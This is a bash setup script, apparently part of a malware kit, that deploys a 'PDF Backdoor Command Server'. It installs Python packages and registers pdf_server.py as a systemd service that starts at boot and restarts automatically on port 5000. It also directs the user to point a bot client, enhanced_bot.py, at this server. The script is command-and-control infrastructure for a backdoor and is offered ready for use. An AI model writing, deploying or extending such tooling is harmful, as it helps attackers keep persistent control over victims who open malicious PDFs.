#!/bin/bash
# Setup script for PDF backdoor server

echo "Setting up PDF Backdoor Server..."

# Install Python dependencies
pip3 install flask reportlab requests pillow

# Create systemd service for the command server
sudo tee /etc/systemd/system/pdf-server.service > /dev/null <<EOF
[Unit]
Description=PDF Backdoor Command Server
After=network.target

[Service]
Type=simple
User=$USER
WorkingDirectory=$(pwd)
ExecStart=/usr/bin/python3 $(pwd)/pdf_server.py
Restart=always
RestartSec=10
Environment=FLASK_ENV=production

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
sudo systemctl enable pdf-server
sudo systemctl start pdf-server

echo "Server setup complete!"
echo "Command server running on port 5000"
echo "Update the server URL in enhanced_bot.py"

